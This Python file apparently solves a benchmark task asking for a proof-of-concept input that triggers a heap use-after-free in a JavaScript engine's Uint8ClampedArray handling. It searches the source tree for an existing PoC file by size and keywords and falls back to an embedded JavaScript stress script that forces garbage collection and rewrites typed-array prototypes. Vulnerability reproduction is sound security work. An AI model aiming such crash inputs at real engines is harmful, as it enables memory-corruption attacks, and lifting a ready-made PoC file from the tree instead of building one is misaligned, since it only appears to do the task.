import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        target_size = 6624
        best_candidate = None
        candidates = []

        for root, dirs, files in os.walk(src_path):
            # Prune common large/irrelevant directories
            dirs[:] = [
                d for d in dirs
                if d not in {
                    '.git', '.hg', '.svn', '__pycache__', 'node_modules',
                    'vendor', 'third_party', 'out', 'build', 'dist', 'target'
                }
            ]
            for name in files:
                path = os.path.join(root, name)
                try:
                    size = os.path.getsize(path)
                except OSError:
                    continue

                base = name.lower()
                ext = os.path.splitext(base)[1]

                # Ignore obviously irrelevant extensions to reduce work
                if ext in {
                    '.o', '.obj', '.a', '.so', '.dll', '.dylib',
                    '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico',
                    '.zip', '.gz', '.bz2', '.xz', '.7z',
                    '.class', '.jar', '.war',
                }:
                    continue

                size_score = 0
                diff = abs(size - target_size)
                if size == target_size:
                    size_score = 100
                elif diff <= 4096:
                    size_score = max(0, 80 - diff // 64)

                name_score = 0
                if "poc" in base or "proof" in base:
                    name_score += 30
                if "uint8clampedarray" in base:
                    name_score += 40
                if "uaf" in base or "use_after_free" in base or "use-after-free" in base:
                    name_score += 25
                if "heap" in base:
                    name_score += 15
                if any(x in base for x in ("crash", "bug", "cve", "issue")):
                    name_score += 10

                path_lower = path.lower()
                if "poc" in path_lower:
                    name_score += 10
                if "test" in path_lower or "tests" in path_lower:
                    name_score += 5

                ext_score = 0
                if ext in {".js", ".html", ".htm"}:
                    ext_score += 10
                elif ext in {".txt", ".log"}:
                    ext_score += 5

                content_score = 0
                # Only inspect content for reasonably small files
                if size <= 10 * 1024 * 1024:
                    try:
                        with open(path, 'rb') as f:
                            chunk = f.read(65536)
                    except OSError:
                        chunk = b""
                    lower_chunk = chunk.lower()
                    if b"uint8clampedarray" in lower_chunk:
                        content_score += 50
                    if (b"use after free" in lower_chunk or
                        b"use-after-free" in lower_chunk or
                        b"uaf" in lower_chunk):
                        content_score += 20
                    if b"poc" in lower_chunk or b"proof of concept" in lower_chunk:
                        content_score += 20
                    if b"heap" in lower_chunk:
                        content_score += 10

                total_score = size_score + name_score + ext_score + content_score
                if total_score > 0:
                    candidates.append((total_score, -size_score, path))

        if candidates:
            candidates.sort(reverse=True)
            best_candidate = candidates[0][2]

        if best_candidate is not None:
            try:
                with open(best_candidate, 'rb') as f:
                    return f.read()
            except OSError:
                pass

        # Fallback heuristic PoC targeting Uint8ClampedArray behavior
        poc = r"""
// Heuristic PoC for Uint8ClampedArray / TypedArray mismatch.
//
// This script aggressively stresses Uint8ClampedArray interactions
// and prototype manipulation, which may trigger heap use-after-free
// bugs in buggy engines.

function spamGC() {
    if (typeof gc === "function") {
        for (let i = 0; i < 1000; ++i) gc();
    }
}

function corruptProto() {
    try {
        Uint8ClampedArray.prototype.__proto__ = Array.prototype;
    } catch (e) {}
    try {
        Object.setPrototypeOf(Uint8ClampedArray.prototype, Array.prototype);
    } catch (e) {}
}

function mixTypedArrays(buf) {
    try {
        let u8  = new Uint8Array(buf);
        let u16 = new Uint16Array(buf);
        let f32 = new Float32Array(buf);
        let i32 = new Int32Array(buf);

        for (let i = 0; i < 32 && i < u8.length; ++i) {
            u8[i] = (i * 13) & 0xff;
        }

        if (f32.length > 0) f32[0] = 3.1415926;
        if (i32.length > 1) i32[1] = -123456789;
        if (u16.length > 2) {
            u16[0] = 0x4141;
            u16[1] = 0x4242;
            u16[2] = 0x4343;
        }
    } catch (e) {}
}

function stressOneRound(round) {
    let arrays = [];
    for (let i = 0; i < 1000; ++i) {
        let len = 256 + (i % 256);
        let a = new Uint8ClampedArray(len);
        a[0] = 255;
        a[1] = -1;
        a[2] = 512;

        if (i % 7 === 0) {
            a.customProp = { idx: i, round: round };
        }

        if (i % 11 === 0) {
            Object.defineProperty(a, "weird" + i, {
                configurable: true,
                enumerable: false,
                value: i * 2 + round,
            });
        }

        if (i % 13 === 0) {
            let sub = a.subarray(1, len - 1);
            let b = new Uint8ClampedArray(sub.buffer, 0, sub.length);
            mixTypedArrays(sub.buffer);
            arrays.push(sub, b);
        }

        if (i % 17 === 0) {
            let dv = new DataView(a.buffer);
            for (let j = 0; j < 16 && j < a.byteLength; ++j) {
                dv.setUint8(j, (j * 31) & 0xff);
            }
        }

        if (i % 19 === 0) {
            let copied = a.slice();
            arrays.push(copied);
        }

        arrays.push(a);

        if (i % 200 === 0) {
            corruptProto();
        }
        if (i % 250 === 0) {
            spamGC();
            arrays = arrays.slice(-100);
        }
    }

    // Mix in higher-level operations
    try {
        arrays.sort(function (x, y) {
            return (x.length || 0) - (y.length || 0);
        });
    } catch (e) {}

    try {
        let concat = [];
        for (let i = 0; i < arrays.length; i += 10) {
            let chunk = arrays[i];
            if (!chunk || typeof chunk.length !== "number") continue;
            for (let j = 0; j < 8 && j < chunk.length; ++j) {
                concat.push(chunk[j]);
            }
        }
        concat.join(",");
    } catch (e) {}

    spamGC();
}

(function main() {
    // Try to exercise any JIT / optimizer paths.
    function hotSum(arr) {
        let s = 0;
        for (let i = 0; i < arr.length; ++i)
            s += arr[i];
        return s;
    }

    let base = new Uint8ClampedArray(1024);
    for (let i = 0; i < base.length; ++i)
        base[i] = i & 0xff;

    for (let i = 0; i < 5000; ++i)
        hotSum(base);

    // Species / @@iterator paths.
    try {
        let speciesCtor = base.constructor[Symbol.species] || base.constructor;
        let other = new speciesCtor(64);
        for (let x of base) {
            if (other.length) other[0] = x;
        }
    } catch (e) {}

    for (let round = 0; round < 10; ++round) {
        stressOneRound(round);
    }

    spamGC();
})();
""".encode("utf-8")

        return poc